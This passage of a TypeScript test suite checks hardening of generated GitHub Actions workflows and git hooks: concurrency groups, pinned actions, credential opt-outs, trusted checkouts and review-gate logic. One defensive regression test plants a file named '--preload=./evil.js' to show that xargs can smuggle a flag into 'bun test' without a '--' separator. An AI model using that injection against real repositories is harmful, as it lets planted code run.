    for (const path of [CHECKS_WORKFLOW_PATH, REVIEW_WORKFLOW_PATH]) {
      const wf = files.get(path) ?? ''
      expect(`${path}: ${wf.includes('concurrency:')}`).toBe(`${path}: true`)
      expect(wf).toContain('cancel-in-progress: true')
      // Keyed per PR, not per workflow — a global group would serialize
      // unrelated pull requests.
      expect(wf).toContain('github.event.pull_request.number')
      // The SHA half is load-bearing: keyed on the PR alone, a rerun of an
      // EARLIER commit's run (which the verdict retrigger performs) lands in
      // the same group and cancels the CURRENT commit's run. Measured on
      // PR #22 — the current run was cancelled after one second.
      expect(wf).toContain('github.event.pull_request.head.sha')
    }
  })

  it('the review-gate retrigger workflow carries its own concurrency group — a superseded head cancels its stale retrigger', async () => {
    // O1 (task-run-v1 20): a newer CI-green completion means a newer push
    // superseded the head the older retrigger was chasing — cancelling it
    // loses nothing the newer completion doesn't already redo. Falls back to
    // the run id when there is no PR (a non-PR branch's CI run), so the
    // group expression never evaluates to an empty string.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const retrigger = generated().get(REVIEW_RETRIGGER_WORKFLOW_PATH) ?? ''
    expect(retrigger).toContain('concurrency:')
    expect(retrigger).toContain('cancel-in-progress: true')
    expect(retrigger).toContain('github.event.workflow_run.pull_requests[0].number')
    expect(retrigger).toContain('github.event.workflow_run.id')
  })

  it('the verdict workflow and the archivist workflow deliberately carry NO concurrency group', async () => {
    // vinaya-review-verdict.yml: self-hosting.md's "One run per pull
    // request" section — serializing the verdict evaluator would delay the
    // retrigger that exists to clear a red gate promptly, and (unlike
    // ci.yml/vinaya-checks.yml) a cancelled evaluation is a verdict that
    // never answers. vinaya-archivist.yml: its three jobs fire on disjoint
    // events (push to main, a daily schedule, workflow_dispatch) and the
    // post-merge job archives a SPECIFIC merge SHA — cancelling an
    // in-progress run for a newer trigger could skip that merge's
    // provenance entirely, unlike the pure-re-evaluation jobs a concurrency
    // group is safe for elsewhere in this file.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()
    for (const path of [REVIEW_VERDICT_WORKFLOW_PATH, ARCHIVIST_WORKFLOW_PATH]) {
      const wf = files.get(path) ?? ''
      expect(`${path}: ${wf.includes('concurrency:')}`).toBe(`${path}: false`)
    }
  })

  it('the verdict retrigger re-runs ONE run — re-running all fights the concurrency group', async () => {
    // Re-running every matching run puts them all in one concurrency group at
    // once; `cancel-in-progress` then kills all but the last, and cancelled
    // runs report red. Measured on PR #21: one verdict re-ran four runs, three
    // were cancelled, and a PR with a clean APPROVE showed three reds.
    // The concurrency group prevents duplicates; this step only has to tell
    // the one surviving run that a verdict landed.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const verdict = generated().get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

    expect(verdict).not.toContain('for RUN_ID in')
    expect(verdict).not.toContain('RUN_IDS')
    expect(verdict).toContain('set -o pipefail')
    expect(verdict).toContain('jq -sr')
    expect(verdict).toContain('| .id][0] // empty')
    expect(verdict).not.toContain('| head -n 1')
    // pull_request_target's run SHA is the default-branch SHA, not the PR
    // head. The immutable run-name carries the PR/head identity instead.
    expect(verdict).toContain('gh api --paginate')
    expect(verdict).toContain('event=pull_request_target')
    expect(verdict).toContain('select(.display_title == $title)')
    expect(verdict).toContain('select(.conclusion != "cancelled")')
    expect(verdict).toContain('--arg title "$RUN_TITLE"')
    expect(verdict).not.toContain('gh run list')
    expect(verdict).not.toContain('--commit "$HEAD_SHA"')
    // The `${{ }}` below is GitHub Actions expression syntax in the generated
    // workflow, asserted verbatim. Making it a template literal — biome's
    // suggested fix — would interpolate it away and the assertion would stop
    // testing the emitted text.
    // biome-ignore lint/suspicious/noTemplateCurlyInString: asserts emitted Actions syntax, not a JS template
    expect(verdict).toContain('HEAD_SHA: ${{ needs.evaluate.outputs.sha }}')
    expect(verdict.indexOf('if [ -z "$HEAD_SHA" ]')).toBeLessThan(verdict.indexOf('gh api --paginate'))
    expect(verdict.indexOf('if [ -z "$PR_NUMBER" ]')).toBeLessThan(verdict.indexOf('gh api --paginate'))
  })

  it('the retrigger lookup never requires status == "completed" — a concurrent retrigger racing an in-flight rerun must still find it (O7, PRs #401/#409)', async () => {
    // Runs 33841069791/33841065139 (found live 2026-09-04): two retriggers
    // for the same head raced the same required run; the loser's query
    // landed while the winner's `gh run rerun` had already flipped the run
    // to `in_progress`, so requiring `status == "completed"` made it
    // invisible to the loser entirely, which gave up rather than also
    // trying (harmlessly no-op'ing on) the same run.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const verdict = generated().get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
    const retrigger = generated().get(REVIEW_RETRIGGER_WORKFLOW_PATH) ?? ''
    for (const workflow of [verdict, retrigger]) {
      expect(workflow).not.toContain('| select(.status == "completed")')
      expect(workflow).toContain('select(.display_title == $title)')
      expect(workflow).toContain('select(.event == "pull_request_target")')
      expect(workflow).toContain('select(.conclusion != "cancelled")')
    }
  })

  it('the verdict retrigger fires on BOTH verdicts — the gate must close, not only open', async () => {
    // The required check stores a conclusion, and that stored conclusion
    // guards the merge button. Gating the retrigger on a clean evaluation
    // made it one-way: an APPROVE turned the check green, and a later
    // REQUEST CHANGES re-ran nothing, so it kept reporting green while the
    // PR stayed mergeable. Measured on this repo's own PR #6 — 52 minutes.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const verdict = generated().get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

    expect(verdict).not.toContain("needs.evaluate.result == 'success'")
    expect(verdict).toContain("!cancelled() && needs.evaluate.result != 'skipped'")
    // The output it consumes must be resolved before any repo content is
    // checked out, or a failed evaluation would leave it empty.
    expect(verdict.indexOf('id: pr')).toBeLessThan(verdict.indexOf('actions/checkout@v4'))

    // Outputs can still be empty when Resolve PR head fails; both immutable
    // run-name components must be guarded before querying all workflow runs.
    expect(verdict).toContain('if [ -z "$PR_NUMBER" ]')
    expect(verdict.indexOf('if [ -z "$PR_NUMBER" ]')).toBeLessThan(verdict.indexOf('gh api --paginate'))
  })

  it('ordinary adopter: gains the credential opt-out, and no vendored token', async () => {
    // The adopter shape emits `persist-credentials: false` on all 6 of its
    // checkouts and nothing vendored. The opt-out is deliberate rather than
    // incidental: the checkout default writes GITHUB_TOKEN into .git/config,
    // and no generated job pushes, so no job needs it. Asserted here because
    // an adopter regenerates these files on `upgrade` — a silent change to
    // the adopter shape reaches every install.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    for (const [path, content] of files) {
      if (!content.includes('actions/checkout@v4')) continue
      const checkouts = content.split('actions/checkout@v4').length - 1
      const optOuts = content.split('persist-credentials: false').length - 1
      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
    }

    // Everything the vendored shape adds stays absent — the adopter still
    // pays nothing for a problem it does not have.
    for (const content of files.values()) {
      expect(content).not.toContain('setup-bun')
      expect(content).not.toContain('--ignore-scripts')
      expect(content).not.toContain('Build the vendored Vinaya CLI')
    }
  })

  it('vendoring repo: the build job is hardened — pinned action, no scripts, no creds', async () => {
    // Each of these is a security review finding, and each is invisible to a
    // test that only checks the invocation moved.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    // The first THIRD-PARTY action this generator writes into an adopter repo,
    // in the job that then builds and runs PR code: pinned to a commit, so a
    // repoint of the mutable tag cannot execute new upstream code everywhere.
    // `vinaya-checks.yml` no longer BUILDS its own copy (O2) — it downloads
    // the one `ci.yml` already built — but it still installs (found live:
    // the downloaded `dist/index.js` imports its external, unbundled deps —
    // `gray-matter`, `zod` — from `node_modules` at require time, and
    // nothing else in that job ever populates it), so it still contributes
    // its own setup-bun. `files`/`occurrences` cover the five paths in
    // `WORKFLOWS` above — body-checks.yml is not one of them (see the O2
    // boundary test, which reads it directly for that reason) — so:
    // checks(1) + review(1) + verdict(1) + archivist(3) = 6.
    expect(occurrences(files, 'oven-sh/setup-bun@v2')).toBe(0)
    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)

    // The install runs against the PR's own dependency manifest.
    expect(occurrences(files, 'bun install --frozen-lockfile --ignore-scripts')).toBe(6)
    expect(occurrences(files, 'bun install --frozen-lockfile\n')).toBe(0)

    // O1: every install is preceded by a restore of Bun's own install cache,
    // keyed on the lockfile — so a second workflow on the same commit
    // installs nothing it doesn't already have. `vinaya-checks.yml`'s
    // install (O2, above) gets one too.
    expect(occurrences(files, 'Restore Bun install cache')).toBe(6)
    expect(occurrences(files, 'actions/cache@v4')).toBe(6)
    expect(occurrences(files, `key: bun-\${{ runner.os }}-\${{ hashFiles('bun.lock', 'bun.lockb') }}`)).toBe(6)

    // Default checkout writes GITHUB_TOKEN into .git/config as an http
    // extraheader — in the same workspace the build then executes.
    for (const [path, content] of files) {
      if (!content.includes('actions/checkout@v4')) continue
      const checkouts = content.split('actions/checkout@v4').length - 1
      const optOuts = content.split('persist-credentials: false').length - 1
      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
    }
  })

  it('vendoring repo: builds and invokes its OWN CLI by path, never npx', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    // All seven invocations move — none left on the broken path.
    expect(occurrences(files, 'npx --yes @attalabs/vinaya')).toBe(0)
    expect(occurrences(files, VENDORED_BIN)).toBe(7)
    // Every job in `WORKFLOWS` installs (6 — see the setup-bun count above);
    // only the jobs that actually BUILD their own copy run the build
    // command — every one except `vinaya-checks.yml`, which downloads the
    // shared build instead (O2) but still installs for the downloaded
    // dist's runtime deps.
    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)
    expect(occurrences(files, 'bun run --cwd apps/cli build')).toBe(5)

    // Per-file: the exact subcommands, in the built-binary shape.
    const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
    const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
    const archivist = files.get(ARCHIVIST_WORKFLOW_PATH) ?? ''
    // The vendored shape pipes through the same tee/step-summary capture as
    // the published shape — the summary is shape-independent.
    expect(checks).toContain(`${VENDORED_BIN} check --all --diff-only | tee vinaya-check-output.txt`)
    expect(checks).toContain('GITHUB_STEP_SUMMARY')
    expect(review).toContain(`${VENDORED_BIN} check review-gate`)
    expect(verdict).toContain(`${VENDORED_BIN} check review-gate`)
    expect(archivist).toContain(`${VENDORED_BIN} archive --merge-sha=${SIGIL}{{ github.sha }}`)
    expect(archivist).toContain(`${VENDORED_BIN} audit --only=dead-branches`)
    expect(archivist).toContain(`${VENDORED_BIN} audit --only=direct-push --sha=${SIGIL}{{ github.sha }}`)
    // The retrigger job executes no repo content and gains no build step.
    expect(occurrences(new Map([[ARCHIVIST_WORKFLOW_PATH, archivist]]), 'setup-bun')).toBe(3)

    // O2: `vinaya-checks.yml` never builds; it downloads the artifact
    // `ci.yml` uploads (but still installs, for the downloaded dist's
    // runtime deps — see above). A `pull_request_target` workflow never
    // downloads an artifact at all — see the boundary test below.
    expect(checks).toContain('oven-sh/setup-bun')
    expect(checks).toContain('bun install --frozen-lockfile --ignore-scripts')
    expect(checks).not.toContain('bun run --cwd apps/cli build')
    expect(checks).toContain('actions/download-artifact@v4')
    expect(checks).toContain(`name: ${CLI_DIST_ARTIFACT_NAME}`)
    expect(checks).toContain('actions/workflows/ci.yml/runs')
    // CI red, found live: download-artifact does not reliably preserve the
    // executable bit `scripts/build.ts` sets on every emitted entrypoint —
    // every check, spawned directly from `dist/checks/bin/*.js`, failed
    // EACCES after download. Restored explicitly, after the download.
    const downloadIdx = checks.indexOf('actions/download-artifact@v4')
    const chmodIdx = checks.indexOf('chmod -R +x apps/cli/dist')
    expect(chmodIdx).toBeGreaterThan(downloadIdx)
  })

  it('O2 boundary: only the shared pull_request build downloads it — pull_request_target workflows always build their own', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()
    const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
    // Not in `generated()`'s WORKFLOWS list — read directly so `?? ''`
    // never silently makes this assertion trivially pass on a missing file.
    const bodyChecks = readFileSync(join(root, BODY_CHECKS_WORKFLOW_PATH), 'utf-8')
    const archivist = files.get(ARCHIVIST_WORKFLOW_PATH) ?? ''
    const retrigger = files.get(REVIEW_RETRIGGER_WORKFLOW_PATH) ?? ''
    const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

    expect(checks).toContain('actions/download-artifact@v4')
    for (const [name, content] of [
      ['review', review],
      ['body-checks', bodyChecks],
      ['archivist', archivist],
      ['retrigger', retrigger],
      ['verdict', verdict]
    ] as const) {
      expect(`${name}: ${content.includes('download-artifact')}`).toBe(`${name}: false`)
      expect(`${name}: ${content.includes(CLI_DIST_ARTIFACT_NAME)}`).toBe(`${name}: false`)
    }
  })

  it('O2 security finding: vinaya-checks.yml grants `actions: read` for the shared-build API calls', async () => {
    // Without it, `gh api .../actions/workflows/ci.yml/runs`, `.../actions/
    // runs/$RUN_ID/artifacts`, and `actions/download-artifact@v4`'s
    // cross-run `run-id` all 403 against GITHUB_TOKEN — an explicit
    // `permissions:` block grants nothing not listed. Scoped to the checks
    // job specifically: the trusted-build workflows never take the
    // shared-build branch and must not gain this scope they don't need.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()
    const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
    const archivist = files.get(ARCHIVIST_WORKFLOW_PATH) ?? ''

    const checksPermissions = checks.slice(checks.indexOf('permissions:'), checks.indexOf('steps:'))
    expect(checksPermissions).toContain('actions: read')
    expect(review).not.toContain('actions: read')
    expect(archivist).not.toContain('actions: read')
  })

  it('every env: wiring survives in BOTH shapes', async () => {
    // PR_BODY/PR_NUMBER are what make the checks EVALUATE rather than pass
    // vacuously. BRANCH remains content-check input but is deliberately
    // absent from authority workflows: a contributor chooses the head ref.
    for (const vendored of [false, true]) {
      rmSync(root, { recursive: true, force: true })
      mkdirSync(root, { recursive: true })
      if (vendored) vendorVinaya()
      await captureStdout(() => runInit(['--yes'], makeDeps()))
      const files = generated()
      const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
      const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
      const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''

      // PR_BODY is fetched live via `gh pr view`, never the event payload.
      expect(checks).not.toContain('github.event.pull_request.body')
      expect(checks).toContain('gh pr view "$PR_NUMBER" --json body --jq .body')
      expect(checks).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
      expect(checks).toContain(expr('BRANCH', 'github.head_ref'))
      expect(review).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
      expect(verdict).toContain(expr('PR_NUMBER', 'steps.pr.outputs.number'))
      expect(verdict).toContain(expr('PR_NUMBER', 'needs.evaluate.outputs.number'))
      expect(review).not.toContain('BRANCH:')
      expect(verdict).not.toContain('BRANCH:')
      expect(verdict).not.toContain('headRefName')
      // GH_TOKEN on every step that talks to the forge: checks 2 (fetch PR
      // body, run checks) + 1 more when vendored (find the shared build,
      // O2), review 2 (require a verdict before building, O3; review gate),
      // retrigger 1 (its own workflow file, Issue #402 O4), verdict 3
      // (resolve-head, evaluate, retrigger), archivist 4 (archive, the O4
      // self-archive step, dead-branch audit, direct-push audit).
      expect(occurrences(files, expr('GH_TOKEN', 'secrets.GITHUB_TOKEN'))).toBe(vendored ? 13 : 12)
    }
  })

  it('review authority executes only trusted default-branch code in BOTH shapes', async () => {
    for (const vendored of [false, true]) {
      rmSync(root, { recursive: true, force: true })
      mkdirSync(root, { recursive: true })
      if (vendored) vendorVinaya()
      await captureStdout(() => runInit(['--yes'], makeDeps()))
      const files = generated()
      const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
      const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
      const [evaluate = '', retrigger = ''] = verdict.split('\n  retrigger:')

      expect(review).toContain('pull_request_target:')
      expect(review).not.toContain('\n  pull_request:\n')
      expect(review).toContain('run-name: "Vinaya Review Gate PR #')
      for (const trustedJob of [review, evaluate]) {
        expect(trustedJob).toContain(expr('ref', 'github.event.repository.default_branch'))
        expect(trustedJob).not.toContain(expr('ref', 'github.event.pull_request.head.sha'))
        expect(trustedJob).not.toContain(expr('ref', 'steps.pr.outputs.sha'))
        expect(trustedJob).not.toContain('refs/pull/')
        expect(trustedJob).not.toContain('Adopter CI setup')
        expect(trustedJob).not.toContain('pull-requests: write')
        expect(trustedJob).not.toContain('contents: write')
      }
      expect(retrigger).not.toContain('actions/checkout')
      expect(retrigger).not.toContain('check review-gate')

      if (vendored) {
        expect(review).toContain('Build the trusted Vinaya CLI')
        expect(evaluate).toContain('Build the trusted Vinaya CLI')
      } else {
        expect(review).toContain(`${PUBLISHED_RUN} check review-gate`)
        expect(evaluate).toContain(`${PUBLISHED_RUN} check review-gate`)
      }
    }
  })

  it('O3: the review gate never builds on an ordinary push — its first step gates on a VERDICT: comment or waiver label, no checkout before it', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''

    const gateIdx = review.indexOf('Require a verdict or waiver before building')
    const checkoutIdx = review.indexOf('actions/checkout@v4')
    const buildIdx = review.indexOf('Build the trusted Vinaya CLI')
    expect(gateIdx).toBeGreaterThan(-1)
    // The gate step is the FIRST step in the job — before any checkout or
    // build — so an ordinary push (opened/synchronize/reopened/labeled/
    // unlabeled) with neither a verdict nor the waiver label yet never pays
    // for either.
    expect(gateIdx).toBeLessThan(checkoutIdx)
    expect(checkoutIdx).toBeLessThan(buildIdx)
    expect(review).toContain('gh pr view "$PR_NUMBER"')
    expect(review).toContain('exit 1')
    // One job, one required check-run name — never a second job/name.
    expect(occurrences(new Map([[REVIEW_WORKFLOW_PATH, review]]), '\n  vinaya-review:')).toBe(1)
    expect(occurrences(new Map([[REVIEW_WORKFLOW_PATH, review]]), 'name: vinaya review gate')).toBe(1)
  })

  it('O1/O2 (task-run-v1 18, #525): the pre-check honours the review waiver, its label and verdict-marker conditions derived from the same constants `check-review-gate.ts` uses', async () => {
    // #525: PR #517 (Version Packages, carrying `vinaya/waiver:review`) went
    // red at this gate in four seconds — the pre-check task 16 added never
    // learned the waiver the full gate downstream already honours. The
    // pre-check must now also build (and hand off to the real gate) on an
    // unverified label alone, without duplicating the label string or the
    // verdict marker as a second hand-typed literal.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()
    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''

    expect(review).not.toContain('contains("VERDICT")')

    // Source-level guarantee (round 2, MAJOR finding): a generated-text
    // match alone cannot tell "imports the shared constant" apart from "a
    // hand-typed literal that happens to equal today's value" — both
    // produce byte-identical output. Reading the generator's OWN source and
    // asserting it imports and splices these two identifiers closes that
    // gap: a regression that reverts to a hand-typed copy (even one that
    // still matches VERDICT_MARKER_SOURCE/WAIVER_LABEL_REVIEW's current
    // value) drops the identifier from the source and fails here.
    const generatorSource = readFileSync(join(import.meta.dir, '..', 'src/lib/artifacts.ts'), 'utf-8')
    expect(generatorSource).toMatch(/import\s*\{[^}]*VERDICT_MARKER_SOURCE[^}]*\}\s*from\s*'@attalabs\/aeg-core'/)
    expect(generatorSource).toMatch(/import\s*\{[^}]*WAIVER_LABEL_REVIEW[^}]*\}\s*from\s*'@attalabs\/aeg-core'/)
    expect(generatorSource).toContain('jqStringEscape(VERDICT_MARKER_SOURCE)')
    expect(generatorSource).toContain('${WAIVER_LABEL_REVIEW}')

    // O2: both conditions are DERIVED from the imported constants at
    // generation time, not a second literal — reproduce the generator's own
    // `jqStringEscape` (double every backslash so jq's string parser
    // reconstructs the exact regex source) and confirm the generated text
    // equals that derivation, not a value that merely happens to match.
    const jqStringEscape = (regexSource: string): string => regexSource.replace(/\\/g, '\\\\')

    expect(review).toContain(`"${WAIVER_LABEL_REVIEW}"`)

    const verdictJqExpr = `[.comments[].body | select((. / "\\n") | any(test("${jqStringEscape(VERDICT_MARKER_SOURCE)}")))] | length > 0`
    expect(review).toContain(verdictJqExpr)

    const labelJqExpr = `[.labels[].name == "${WAIVER_LABEL_REVIEW}"] | any`
    expect(review).toContain(labelJqExpr)

    // Three fixtures (O1), the jq expressions run for real against each:
    // neither marker nor label present — red, stays unbuilt; the label alone
    // (unverified) — builds; a real verdict alone — builds.
    const runJq = (jqExpr: string, input: unknown): string =>
      execFileSync('jq', [jqExpr], { input: JSON.stringify(input), encoding: 'utf8' }).trim()

    const neither = { comments: [{ body: 'just discussion, no verdict here' }], labels: [] }
    expect(runJq(verdictJqExpr, neither)).toBe('false')
    expect(runJq(labelJqExpr, neither)).toBe('false')

    const labelOnly = {
      comments: [{ body: 'just discussion, no verdict here' }],
      labels: [{ name: 'vinaya/waiver:review' }]
    }
    expect(runJq(verdictJqExpr, labelOnly)).toBe('false')
    expect(runJq(labelJqExpr, labelOnly)).toBe('true')

    const verdictOnly = { comments: [{ body: 'some discussion\nVERDICT: PASS\nJudged head: abc123' }], labels: [] }
    expect(runJq(verdictJqExpr, verdictOnly)).toBe('true')
    expect(runJq(labelJqExpr, verdictOnly)).toBe('false')

    // The marker itself still rejects a bare mention and a
    // blockquoted/list-item/heading mention, exactly as before.
    const runJqVerdict = (body: string): string => runJq(verdictJqExpr, { comments: [{ body }] })
    expect(runJqVerdict('this checks for a VERDICT: comment in prose')).toBe('false')
    expect(runJqVerdict('**VERDICT: APPROVE**')).toBe('true')
    expect(runJqVerdict('> VERDICT: APPROVE')).toBe('false')
    expect(runJqVerdict('# VERDICT: APPROVE')).toBe('false')
  })

  it('the hook stubs resolve the vendored bin too (atta-labs/attalabs#935 corrects this case)', async () => {
    // This test previously asserted the opposite — "a vendoring repo's hooks
    // stay exactly as they are" — which was #929's stated scope: workflows
    // only. That scope left the two hook emitters on the published spec, and
    // in a vendoring repo the published spec cannot resolve: npm matches the
    // package NAME against the local member and execs its unbuilt bin, so
    // `|| exit 1` blocked every commit and push. #935 is that remainder.
    // The version pin the old assertion protected is unrelated to this, and
    // still holds for the ordinary adopter — asserted below and in the two
    // `selfHost: null` hook tests above.
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('node apps/cli/dist/index.js check')
    expect(hook).not.toContain('npx --yes')
  })
})

describe('generated pre-commit hook: --skip-full (#397 round 2)', () => {
  it('pre-commit carries --skip-full; pre-push does not', async () => {
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const preCommit = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(preCommit).toContain('check --all --diff-only --local --skip-full')
    expect(prePush).not.toContain('--skip-full')
  })
})

describe('generated pre-push hook: stdin forwarded as VINAYA_PUSH_REFS (#407 O2)', () => {
  it('reads its own stdin and exports it before running the check', async () => {
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(prePush).toContain('VINAYA_PUSH_REFS="$(cat)"')
    expect(prePush).toContain('export VINAYA_PUSH_REFS')
    // The read/export must precede the check invocation, not follow it.
    expect(prePush.indexOf('VINAYA_PUSH_REFS="$(cat)"')).toBeLessThan(prePush.indexOf('check --all --local'))
  })

  it('pre-commit does not forward stdin — it never runs on a push', async () => {
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const preCommit = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(preCommit).not.toContain('VINAYA_PUSH_REFS')
  })
})

describe('generated pre-push hook: affected tests (#407 O4)', () => {
  function vendorVinaya(): void {
    writeFileSync(
      join(root, 'package.json'),
      `${JSON.stringify({ name: 'vinaya', private: true, workspaces: ['apps/*', 'packages/*'] }, null, 2)}\n`
    )
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(
      join(root, 'apps/cli/package.json'),
      `${JSON.stringify({ name: '@attalabs/vinaya', version: '0.4.6', bin: { vinaya: './dist/index.js' } }, null, 2)}\n`
    )
  }

  it('runs Biome (O5) as the hook literal first step, then the check, then typecheck + the file-level test selector (O6), with no --concurrency=1 (O7) — vendored repo only', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(prePush).toContain('bunx biome check --no-errors-on-unmatched -- || exit 1')
    expect(prePush).toContain('bunx turbo typecheck --affected || exit 1')
    expect(prePush).toContain('bun apps/cli/src/lib/pre-push-changed-files.ts')
    expect(prePush).toContain('bun apps/cli/src/lib/pre-push-select-tests.ts')
    expect(prePush).not.toContain('--concurrency=1')
    expect(prePush).not.toContain('turbo test --affected')
    // Ordering (round-5 ruling): Biome runs literally before anything else
    // in the hook, including the doctrine gate — then the check, then
    // typecheck, then the selector.
    const biomeIdx = prePush.indexOf('bunx biome check')
    const checkIdx = prePush.indexOf('check --all --local')
    const typecheckIdx = prePush.indexOf('bunx turbo typecheck --affected')
    const selectorIdx = prePush.indexOf('pre-push-select-tests.ts')
    expect(biomeIdx).toBeLessThan(checkIdx)
    expect(checkIdx).toBeLessThan(typecheckIdx)
    expect(typecheckIdx).toBeLessThan(selectorIdx)
  })

  it("unsets every GIT_* variable before running the selected tests, AFTER selecting them (a fixture test creating its own git repo elsewhere must never inherit this hook invocation's own GIT_DIR/GIT_WORK_TREE) — vendored repo only", async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(prePush).toContain("for _vinaya_git_var in $(env | grep -o '^GIT_[A-Z_]*='); do")
    expect(prePush).toContain('unset "${_vinaya_git_var%=*}"')
    const selectIdx = prePush.indexOf('pre-push-select-tests.ts')
    const unsetIdx = prePush.indexOf('_vinaya_git_var')
    const runTestsIdx = prePush.indexOf('xargs bun test')
    expect(selectIdx).toBeLessThan(unsetIdx)
    expect(unsetIdx).toBeLessThan(runTestsIdx)
  })

  it('the GIT_* unset step really does isolate a child process from an ambient GIT_DIR/GIT_WORK_TREE — real subprocess, real env, no simulation shortcuts', () => {
    // Extracts and runs the hook's own unset snippet in a real `sh`, exactly
    // as the generated hook would, then proves a `git` call afterward can no
    // longer see the ambient GIT_DIR/GIT_WORK_TREE this test seeds — the
    // exact live incident (task-run-v1 20): a fixture test's own git fixture,
    // created elsewhere, inherited the pre-push hook's real GIT_DIR and had
    // several of its own commits land for real on the branch being pushed.
    const script = `
GIT_DIR=/tmp/should-never-be-read GIT_WORK_TREE=/tmp/should-never-be-read
export GIT_DIR GIT_WORK_TREE
for _vinaya_git_var in $(env | grep -o '^GIT_[A-Z_]*='); do
  unset "\${_vinaya_git_var%=*}"
done
echo "GIT_DIR after unset: [$GIT_DIR]"
git rev-parse --git-dir 2>&1 || true
`
    const out = execFileSync('sh', ['-c', script], { cwd: '/tmp', encoding: 'utf8' })
    expect(out).toContain('GIT_DIR after unset: []')
    expect(out).not.toContain('/tmp/should-never-be-read')
  })

  it("both xargs pipelines stop flag parsing with a trailing '--' before the file list, so a tracked file named like a CLI flag is never forwarded as one (round-4 security review, HIGH/MEDIUM)", async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(prePush).toContain('xargs bunx biome check --no-errors-on-unmatched -- ||')
    expect(prePush).toContain('xargs bun test --timeout=30000 -- ||')
  })

  it("real subprocess: 'bun test --' really does refuse to treat a selected file named like a flag as one — without it, a tracked file named '--preload=<module>' would load and run that module (round-4 security review, HIGH)", () => {
    const dir = mkdtempSync(join(tmpdir(), 'vinaya-xargs-injection-'))
    try {
      writeFileSync(join(dir, 'evil.js'), 'console.log("EVIL PRELOAD RAN")\n')
      mkdirSync(join(dir, 'sub'))
      writeFileSync(
        join(dir, 'sub/normal.test.ts'),
        'import { expect, test } from "bun:test"\ntest("ok", () => { expect(1).toBe(1) })\n'
      )
      // The malicious "selected test file" is a bare flag string, exactly the
      // shape `xargs` would forward verbatim with no `--` ahead of it.
      const selected = 'sub/normal.test.ts\n--preload=./evil.js'

      const withoutSeparator = execFileSync('sh', ['-c', 'xargs bun test 2>&1'], {
        cwd: dir,
        input: selected,
        encoding: 'utf8'
      })
      expect(withoutSeparator).toContain('EVIL PRELOAD RAN')

      const withSeparator = execFileSync('sh', ['-c', 'xargs bun test -- 2>&1'], {
        cwd: dir,
        input: selected,
        encoding: 'utf8'
      })
      expect(withSeparator).not.toContain('EVIL PRELOAD RAN')
      expect(withSeparator).toContain('normal.test.ts')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('the old --concurrency=1 guard leaves no trace in turbo.json either — no repo-wide setting CI or the hook would inherit', () => {
    const turboJson = JSON.parse(readFileSync(join(import.meta.dir, '..', '..', '..', 'turbo.json'), 'utf-8'))
    expect(turboJson).not.toHaveProperty('concurrency')
    expect(turboJson.tasks?.test).not.toHaveProperty('concurrency')
  })

  it('an ordinary (non-vendored) adopter never gets the Biome/typecheck/selector steps — no assumption they run Bun/Biome/Turborepo', async () => {
    await captureStdout(() => runInit(['--yes'], makeDeps()))
